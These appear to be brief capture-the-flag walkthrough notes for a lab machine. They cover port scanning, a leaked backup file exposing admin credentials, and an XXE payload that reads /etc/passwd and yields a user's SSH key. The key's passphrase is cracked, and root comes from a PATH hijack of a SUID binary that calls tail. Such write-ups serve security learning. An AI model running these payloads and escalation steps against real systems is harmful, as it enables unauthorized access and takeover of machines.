start with nmap

22
80
8765

***

80 http

http://10.10.89.43/custom/js/users.bak

found admin: bulldog19

***

<!-- Barry, you can now SSH in using your key!-->

found user barry



```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd">]>
<comment>
	<name>test</name>
	<author>Barry Clad</author>
	<com> &example; </com>
</comment>

```

got barry private key.


key is encrypted with passphase

crack with ssh2john : `urieljames`

***

privs

suid bit set on : /home/joe/live_log


strings live_log

found that this binary uses tail without proper path.

tail -f /var/log/nginx/access.log

add /tmp to path
`export PATH=/tmp:$PATH`

`echo "/bin/bash" > /tmp/tail`

`chmod +x /tmp/tail `

`./live_log `

GOT root shell


